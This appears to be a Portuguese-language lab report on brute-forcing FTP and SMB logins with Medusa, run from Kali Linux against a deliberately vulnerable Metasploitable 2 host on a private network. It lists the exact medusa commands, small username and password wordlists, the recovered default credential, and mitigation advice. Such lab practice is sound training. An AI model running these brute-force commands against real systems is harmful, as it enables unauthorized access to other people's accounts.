# kali-medusa-brute-force
Ataque de Brute Force com Medusa em ambiente controlado
# Relatório de Testes de Força Bruta

## Ambiente
- **Atacante:** Kali Linux (192.168.56.102)
- **Alvo:** Metasploitable 2 (192.168.56.101)

## Ataques Realizados

### 1. FTP (Porta 21)
**Comando:** `medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp`
**Resultado:** Credencial comprometida - `msfadmin:msfadmin`

### 2. SMB (Portas 139/445)  
**Comando:** `medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt`
**Resultado:** Credencial comprometida - `msfadmin:msfadmin`

## Medidas de Mitigação
- Implementar políticas de senha complexas
- Limitar tentativas de login
- Usar autenticação de dois fatores
- Monitorar logs de acesso

## Wordlists Utilizadas
- `users.txt`: msfadmin, admin, root, user, test
- `passwords.txt`: msfadmin, password, 123456, admin, test, 1234
